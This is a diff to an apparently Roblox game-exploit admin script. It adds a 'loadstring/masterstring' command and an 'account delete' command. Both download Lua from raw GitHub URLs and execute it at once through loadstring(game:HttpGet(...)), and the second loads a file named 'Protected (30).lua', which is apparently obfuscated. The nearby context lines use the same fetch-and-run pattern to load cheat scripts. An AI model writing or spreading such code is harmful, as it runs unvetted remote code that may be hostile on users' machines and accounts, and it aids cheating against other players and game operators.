@@ -4257,6 +4257,8 @@ CMDs[#CMDs + 1] = {NAME = 'epicminigames', DESC = 'epicminigamesGui'}
 CMDs[#CMDs + 1] = {NAME = 'vapev4 / vape', DESC = 'Loads VapeV4.'}
 CMDs[#CMDs + 1] = {NAME = 'vynixius / vy', DESC = 'Loads Vynixius Loader.'}
 CMDs[#CMDs + 1] = {NAME = 'health [num] / h [num]', DESC = 'Just set your health.'}
+CMDs[#CMDs + 1] = {NAME = 'loadstring / masterstring / load', DESC = 'Opens masterstring'}
+CMDs[#CMDs + 1] = {NAME = 'accountdelete / accdel / deleteaccount', DESC = 'open account delete gui(pools)'}
 CMDs[#CMDs + 1] = {NAME = 'console', DESC = 'Loads old Roblox console'}
 CMDs[#CMDs + 1] = {NAME = 'explorer / dex', DESC = 'Opens DEX by Moon'}
 CMDs[#CMDs + 1] = {NAME = 'olddex / odex', DESC = 'Opens Old DEX by Moon'}
@@ -10062,6 +10064,15 @@ addcmd('carcrusher2',{'car2'},function(args, speaker)
 	loadstring(game:HttpGet("https://pastebin.com/raw/NkEFsUWm"))()
 end)
 
+addcmd('loadstring',{'masterstring', 'load'},function(args, speaker)
+	if game.PlaceId == 6839171747 then -- doors lobby
+		notify("doors masterstring",'make sure you have executed Terminalvives script')
+	end
+	-- Full credit to GMDMachine
+	-- ok
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/ISJ0629/masterscript/main/LoadString_1.0.lua"))()
+end)
+
 addcmd('doorscrucifix',{'crucifix', 'cr'},function(args, speaker)
 	-- Full credit to PenguinManiac
 	-- ok
@@ -10070,6 +10081,11 @@ addcmd('doorscrucifix',{'crucifix', 'cr'},function(args, speaker)
 	_G.OnAnything = true
 	_G.Fail = false
 	loadstring(game:HttpGet('https://raw.githubusercontent.com/PenguinManiack/Crucifix/main/Crucifix.lua'))()
+end)
+
+addcmd('accountdeete',{'accdel', 'deleteaccount'},function(args, speaker)
+	-- Full credit to kiwi
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/iimateiYT/Scripts/main/Protected%20(30).lua", true))()
 end)
 
 addcmd('scanner',{'doorsscanner'},function(args, speaker)
